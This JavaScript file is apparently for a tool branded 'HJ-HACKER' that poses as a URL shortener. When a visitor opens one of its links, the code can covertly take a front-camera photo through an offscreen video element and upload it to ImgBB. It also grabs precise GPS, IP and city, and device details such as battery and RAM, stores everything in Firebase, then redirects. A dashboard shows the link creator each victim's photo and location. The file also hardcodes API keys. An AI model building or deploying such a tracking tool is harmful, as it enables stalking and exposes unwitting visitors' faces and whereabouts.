// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// ImgBB API Key
const IMGBB_API_KEY = "1c64909854fd8f51eaad9f03c965ad78";

let deleteCode = null;

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// Camera Capture with ImgBB Upload
async function captureAndUploadPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user",
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        document.body.appendChild(video);

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 500);
            };
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/jpeg', 0.8);

        stream.getTracks().forEach(track => track.stop());
        video.remove();

        if (imageData && imageData !== 'data:,' && imageData.length > 500) {
            const formData = new FormData();
            formData.append('image', imageData.split(',')[1]);
            formData.append('key', IMGBB_API_KEY);

            const response = await fetch('https://api.imgbb.com/1/upload', {
                method: 'POST',
                body: formData
            });
            const result = await response.json();

            if (result.success) {
                return result.data.url;
            }
        }
        return null;
    } catch (error) {
        console.error('Camera error:', error);
        return null;
    }
}

// Location Capture
async function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.log('Location error:', error.message);
                resolve(null);
            },
            { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
        );
    });
}

// Complete Device Info
async function getAdvancedDeviceInfo() {
    const ua = navigator.userAgent;
    
    let browser = 'Unknown';
    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    
    let os = 'Unknown';
    if (ua.includes('iPhone')) os = 'iOS';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac')) os = 'macOS';
    
    let deviceBrand = 'Unknown';
    if (ua.includes('iPhone')) deviceBrand = 'Apple';
    else if (ua.includes('SM-')) deviceBrand = 'Samsung';
    else if (ua.includes('MI')) deviceBrand = 'Xiaomi';
    else if (ua.includes('Pixel')) deviceBrand = 'Google';
    
    let batteryLevel = 'Unknown';
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
        } catch(e) {}
    }
    
    let connectionType = 'Unknown';
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || 'Unknown';
    }
    
    return {
        browser: browser,
        os: os,
        device_brand: deviceBrand,
        device_model: os,
        screen_width: screen.width,
        screen_height: screen.height,
        language: navigator.language || 'Unknown',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
        battery_level: batteryLevel,
        connection_type: connectionType,
        device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
        hardware_concurrency: navigator.hardwareConcurrency || 'Unknown'
    };
}

// IP Info
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            country: data.country_name || 'Unknown',
            latitude: data.latitude || null,
            longitude: data.longitude || null
        };
    } catch (error) {
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', latitude: null, longitude: null };
    }
}

// Delete Link
async function deleteLink(code) {
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        
        await database.ref(`urls/${code}`).remove();
        await database.ref(`domains/${encodedDomain}/${code}`).remove();
        await database.ref(`analytics/${code}`).remove();
        
        showToast('Deleted', `Link /${code} deleted!`, 'success');
        showLinks();
        showStats();
        showRecent();
        return true;
    } catch (error) {
        showToast('Error', 'Failed to delete', 'error');
        return false;
    }
}

// Shorten URL
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    try {
        new URL(urlToShorten);
    } catch {
        showToast('Error', 'Invalid URL', 'error');
        return;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const exists = await checkCodeExists(shortCode);
    if (exists) {
        showToast('Error', `Code "${shortCode}" already taken`, 'error');
        return;
    }
    
    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc')?.value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton')?.value : null;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    
    if (hasPassword && !password) {
        showToast('Error', 'Please enter password', 'error');
        return;
    }
    
    if (hasSocialGate && (!socialTitle || !socialUrl)) {
        showToast('Error', 'Please fill social gate details', 'error');
        return;
    }
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);
        
        const linkData = {
            long_url: urlToShorten,
            domain: domain,
            created_at: createdAt,
            device_id: deviceId,
            clicks: 0,
            animation_type: animation
        };
        
        if (password) linkData.password = password;
        if (socialTitle) {
            linkData.social_gate_title = socialTitle;
            linkData.social_gate_url = socialUrl;
            linkData.social_gate_icon = socialIcon;
            if (socialDesc) linkData.social_gate_description = socialDesc;
            if (socialButton) linkData.social_gate_button_text = socialButton;
        }
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        
        document.getElementById('shortLink').textContent = shortUrl;
        document.getElementById('result').classList.remove('hidden');
        
        const qrDiv = document.getElementById('qrCode');
        qrDiv.innerHTML = '';
        new QRCode(qrDiv, {
            text: shortUrl,
            width: 100,
            height: 100,
            colorDark: "#00ff41",
            colorLight: "#000000"
        });
        
        showToast('Success', 'Link created!', 'success');
        
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        document.getElementById('passwordSection').classList.add('hidden');
        document.getElementById('socialSection').classList.add('hidden');
        if (document.getElementById('password')) document.getElementById('password').value = '';
        
        showLinks();
        showStats();
        
    } catch (error) {
        showToast('Error', error.message || 'An error occurred', 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('shortenBtn');
    if (show) {
        if (loading) loading.classList.remove('hidden');
        if (btn) btn.disabled = true;
    } else {
        if (loading) loading.classList.add('hidden');
        if (btn) btn.disabled = false;
    }
}

// Display Functions
function updateDisplay(title, icon, contentHtml) {
    const headerIcon = document.getElementById('dataDisplayHeader')?.querySelector('i');
    const headerTitle = document.getElementById('dataDisplayTitle');
    const contentDiv = document.getElementById('dataDisplayContent');
    
    if (headerIcon) headerIcon.className = `fas ${icon}`;
    if (headerTitle) headerTitle.textContent = title;
    if (contentDiv) contentDiv.innerHTML = contentHtml;
}

// Show Links
async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading links...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const links = [];
        
        snapshot.forEach(child => {
            links.push({ code: child.key, ...child.val() });
        });
        
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links created yet</p></div>');
            return;
        }
        
        const html = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${link.code}</span>
                    <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mouse-pointer"></i> Clicks: ${link.clicks || 0}</span>
                    ${link.password ? '<span><i class="fas fa-lock"></i> Password</span>' : ''}
                    ${link.social_gate_url ? '<span><i class="fas fa-share-alt"></i> Social Gate</span>' : ''}
                </div>
                <div class="data-item-actions">
                    <button class="btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> Data</button>
                    <button class="btn-sm" onclick="confirmDelete('${link.code}')" style="background: rgba(255,68,68,0.2);"><i class="fas fa-trash-alt"></i> Delete</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch (error) {
        updateDisplay('YOUR LINKS', 'fa-exclamation-triangle', '<div class="empty-data">Error loading links</div>');
    }
}

// Show Stats
async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading stats...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        let totalClicks = 0, totalLinks = 0;
        
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            totalClicks += data.clicks || 0;
            totalLinks++;
        }
        
        const html = `
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value">${totalLinks}</div>
                    <div class="stat-label"><i class="fas fa-link"></i> Total Links</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${totalClicks}</div>
                    <div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div>
                </div>
            </div>
        `;
        
        updateDisplay('STATISTICS', 'fa-chart-line', html);
    } catch (error) {
        updateDisplay('STATISTICS', 'fa-exclamation-triangle', '<div class="empty-data">Error loading stats</div>');
    }
}

// Show Recent Visitors
async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading recent activity...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const allVisitors = [];
        
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const analyticsSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(30).get();
            analyticsSnapshot.forEach(analytic => {
                const data = analytic.val();
                allVisitors.push({
                    code: code,
                    ip: data.ip_address,
                    city: data.city,
                    country: data.country,
                    browser: data.browser,
                    os: data.os,
                    timestamp: data.created_at,
                    camera: data.captured_image,
                    lat: data.latitude,
                    lng: data.longitude
                });
            });
        }
        
        allVisitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = allVisitors.slice(0, 15);
        
        if (recent.length === 0) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity yet</p></div>');
            return;
        }
        
        const html = recent.map(v => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${v.code}</span>
                    <span class="data-item-date"><i class="fas fa-clock"></i> ${new Date(v.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-globe"></i> ${v.ip || 'Unknown'}</span>
                    <span><i class="fas fa-map-marker-alt"></i> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fab fa-${(v.browser || 'chrome').toLowerCase()}"></i> ${v.browser || 'Unknown'}</span>
                    <span><i class="fas fa-desktop"></i> ${v.os || 'Unknown'}</span>
                </div>
                ${v.lat ? `<div class="data-item-stats"><i class="fas fa-satellite-dish"></i> GPS: ${v.lat.toFixed(4)}, ${v.lng?.toFixed(4)} <button class="btn-sm" onclick="window.open('https://maps.google.com?q=${v.lat},${v.lng}', '_blank')">View Map</button></div>` : ''}
                ${v.camera ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Photo captured! <button class="btn-sm" onclick="viewPhoto('${v.camera.replace(/'/g, "\\'")}')"><i class="fas fa-eye"></i> View</button></div>` : ''}
                <div class="data-item-actions">
                    <button class="btn-sm" onclick="viewAnalytics('${v.code}')"><i class="fas fa-chart-line"></i> Full Data</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch (error) {
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data">Error loading recent activity</div>');
    }
}

// View Analytics
window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading analytics...</p></div>');
    
    try {
        const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(100).get();
        const analytics = [];
        snapshot.forEach(child => analytics.push(child.val()));
        analytics.reverse();
        
        const linkSnapshot = await database.ref(`urls/${code}`).get();
        const linkData = linkSnapshot.val();
        
        let html = `
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value">${analytics.length}</div>
                    <div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div>
                </div>
            </div>
            <div style="margin-bottom: 12px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 8px;">
                <div style="font-size: 0.7rem; word-break: break-all;"><i class="fas fa-link"></i> ${linkData?.long_url || 'N/A'}</div>
            </div>
        `;
        
        if (analytics.length === 0) {
            html += '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors yet. Share your link!</p></div>';
        } else {
            analytics.forEach(v => {
                html += `
                    <div class="data-item">
                        <div class="data-item-header">
                            <span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'}</span>
                            <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(v.created_at).toLocaleString()}</span>
                        </div>
                        <div class="data-item-stats"><strong>Device:</strong> ${v.device_brand || ''} ${v.device_model || v.os || 'Unknown'}</div>
                        <div class="data-item-stats"><strong>Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'}</div>
                        <div class="data-item-stats"><strong>Battery:</strong> ${v.battery_level || 'Unknown'} | <strong>Network:</strong> ${v.connection_type || 'Unknown'}</div>
                        <div class="data-item-stats"><strong>RAM:</strong> ${v.device_memory || 'Unknown'} | <strong>CPU:</strong> ${v.hardware_concurrency || 'Unknown'}</div>
                        <div class="data-item-stats"><strong>Screen:</strong> ${v.screen_width || '?'}x${v.screen_height || '?'}</div>
                        <div class="data-item-stats"><strong>Language:</strong> ${v.language || 'Unknown'} | <strong>Timezone:</strong> ${v.timezone || 'Unknown'}</div>
                        <div class="data-item-stats"><strong>Location:</strong> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
                        ${v.latitude ? `<div class="data-item-stats"><strong>GPS:</strong> ${v.latitude.toFixed(4)}, ${v.longitude?.toFixed(4)} <button class="btn-sm" onclick="window.open('https://maps.google.com?q=${v.latitude},${v.longitude}', '_blank')"><i class="fas fa-map"></i> Open Map</button></div>` : ''}
                        ${v.captured_image ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Photo captured! <button class="btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g, "\\'")}')"><i class="fas fa-eye"></i> View</button></div>` : ''}
                    </div>
                `;
            });
        }
        
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
        showToast('Success', `Loaded ${analytics.length} records!`, 'success');
    } catch (error) {
        updateDisplay('ERROR', 'fa-exclamation-triangle', '<div class="empty-data">Error loading analytics</div>');
        showToast('Error', 'Failed to load analytics', 'error');
    }
};

// View Photo
window.viewPhoto = (imageData) => {
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    if (modal && img && imageData && imageData !== 'black_screen') {
        img.src = imageData;
        modal.classList.remove('hidden');
    } else {
        showToast('Error', 'No valid photo available', 'error');
    }
};

function closePhotoModal() {
    document.getElementById('photoModal').classList.add('hidden');
}

function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src && img.src !== '') {
        const link = document.createElement('a');
        link.download = 'captured_photo_' + Date.now() + '.jpg';
        link.href = img.src;
        link.click();
        showToast('Success', 'Photo downloaded!', 'success');
    }
}

// Confirm Delete
window.confirmDelete = (code) => {
    deleteCode = code;
    document.getElementById('deleteLinkCode').textContent = `/${code}`;
    document.getElementById('deleteModal').classList.remove('hidden');
};

window.executeDelete = async () => {
    if (deleteCode) {
        await deleteLink(deleteCode);
        deleteCode = null;
        document.getElementById('deleteModal').classList.add('hidden');
    }
};

window.cancelDelete = () => {
    deleteCode = null;
    document.getElementById('deleteModal').classList.add('hidden');
};

window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied!', 'success');
};

// Visitor Redirect Handler
async function handleVisitorRedirect() {
    const path = window.location.pathname;
    if (path === '/' || path === '/index.html') return;
    
    const shortCode = path.substring(1);
    if (!shortCode) return;
    
    try {
        const snapshot = await database.ref(`urls/${shortCode}`).get();
        if (!snapshot.exists()) return;
        
        const linkData = snapshot.val();
        
        let cameraImg = null;
        let locationData = null;
        
        if (linkData.capture_camera) {
            cameraImg = await captureAndUploadPhoto();
        }
        if (linkData.capture_location) {
            locationData = await captureLocation();
        }
        
        const ipInfo = await getIPInfo();
        const deviceInfo = await getAdvancedDeviceInfo();
        
        const analyticsData = {
            created_at: new Date().toISOString(),
            ip_address: ipInfo.ip,
            city: ipInfo.city,
            country: ipInfo.country,
            latitude: locationData?.latitude || ipInfo.latitude,
            longitude: locationData?.longitude || ipInfo.longitude,
            accuracy: locationData?.accuracy,
            captured_image: cameraImg,
            ...deviceInfo
        };
        
        await database.ref(`analytics/${shortCode}`).push(analyticsData);
        await database.ref(`urls/${shortCode}/clicks`).transaction(c => (c || 0) + 1);
        
        if (linkData.password) {
            sessionStorage.setItem(`pending_link_${shortCode}`, linkData.long_url);
            sessionStorage.setItem(`pending_password_${shortCode}`, linkData.password);
            showPasswordModal(shortCode);
            return;
        }
        
        if (linkData.social_gate_url) {
            sessionStorage.setItem(`pending_link_${shortCode}`, linkData.long_url);
            showSocialModal(linkData);
            return;
        }
        
        window.location.href = linkData.long_url;
        
    } catch (error) {
        console.error('Redirect error:', error);
    }
}

function showPasswordModal(code) {
    const modal = document.getElementById('passwordModal');
    const input = document.getElementById('modalPassword');
    const errorDiv = document.getElementById('modalError');
    
    if (!modal) return;
    modal.classList.remove('hidden');
    
    const unlockBtn = document.getElementById('modalUnlock');
    const cancelBtn = document.getElementById('modalCancel');
    
    const checkPassword = () => {
        const entered = input.value;
        const storedPw = sessionStorage.getItem(`pending_password_${code}`);
        const targetUrl = sessionStorage.getItem(`pending_link_${code}`);
        
        if (entered === storedPw) {
            sessionStorage.removeItem(`pending_password_${code}`);
            sessionStorage.removeItem(`pending_link_${code}`);
            modal.classList.add('hidden');
            window.location.href = targetUrl;
        } else {
            errorDiv.classList.remove('hidden');
            errorDiv.textContent = 'Incorrect password!';
        }
    };
    
    unlockBtn.onclick = checkPassword;
    cancelBtn.onclick = () => {
        modal.classList.add('hidden');
        window.location.href = '/';
    };
    input.onkeypress = (e) => { if (e.key === 'Enter') checkPassword(); };
}

function showSocialModal(linkData) {
    const modal = document.getElementById('socialModal');
    if (!modal) return;
    
    const iconDiv = document.getElementById('socialModalIcon');
    const titleEl = document.getElementById('socialModalTitle');
    const descEl = document.getElementById('socialModalDesc');
    const btnEl = document.getElementById('socialModalBtn');
    
    const icon = linkData.social_gate_icon || 'youtube';
    iconDiv.innerHTML = `<i class="fab fa-${icon}" style="font-size: 48px; color: #ff4444;"></i>`;
    titleEl.textContent = linkData.social_gate_title || 'Follow to Unlock';
    descEl.textContent = linkData.social_gate_description || 'Complete the action below';
    btnEl.innerHTML = `<i class="fas fa-external-link-alt"></i> ${linkData.social_gate_button_text || 'Verify & Continue'}`;
    
    modal.classList.remove('hidden');
    
    btnEl.onclick = () => {
        window.open(linkData.social_gate_url, '_blank');
        setTimeout(() => {
            const targetUrl = sessionStorage.getItem(`pending_link_${window.location.pathname.substring(1)}`);
            if (targetUrl) {
                sessionStorage.removeItem(`pending_link_${window.location.pathname.substring(1)}`);
                window.location.href = targetUrl;
            }
        }, 3000);
    };
}

// Event Listeners
document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => {
    const link = document.getElementById('shortLink')?.textContent;
    if (link) copyToClipboard(link);
});

document.getElementById('passwordToggle')?.addEventListener('change', (e) => {
    document.getElementById('passwordSection')?.classList.toggle('hidden');
});

document.getElementById('socialToggle')?.addEventListener('change', (e) => {
    document.getElementById('socialSection')?.classList.toggle('hidden');
});

document.querySelectorAll('.icon-option').forEach(icon => {
    icon.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
        document.getElementById('socialIcon').value = icon.dataset.icon;
    });
});

document.getElementById('advancedToggle')?.addEventListener('click', () => {
    document.getElementById('advancedContent')?.classList.toggle('hidden');
});

document.getElementById('confirmDeleteBtn')?.addEventListener('click', executeDelete);
document.getElementById('cancelDeleteBtn')?.addEventListener('click', cancelDelete);
document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
document.getElementById('closePhotoModalBtn')?.addEventListener('click', closePhotoModal);
document.getElementById('downloadPhotoBtn')?.addEventListener('click', downloadPhoto);

// Bottom Navigation
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click any button to view data', 'fa-fingerprint',
                '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT button</p></div>');
        } else if (tab === 'links') {
            showLinks();
        } else if (tab === 'stats') {
            showStats();
        } else if (tab === 'recent') {
            showRecent();
        }
    });
});

// Close modals on outside click
window.addEventListener('click', (e) => {
    const photoModal = document.getElementById('photoModal');
    const deleteModal = document.getElementById('deleteModal');
    const passwordModal = document.getElementById('passwordModal');
    const socialModal = document.getElementById('socialModal');
    if (e.target === photoModal) closePhotoModal();
    if (e.target === deleteModal) cancelDelete();
    if (e.target === passwordModal) passwordModal?.classList.add('hidden');
    if (e.target === socialModal) socialModal?.classList.add('hidden');
});

// Initialize
handleVisitorRedirect();
console.log('🔥 HJ-HACKER Loaded - All features working with Font Awesome icons!');
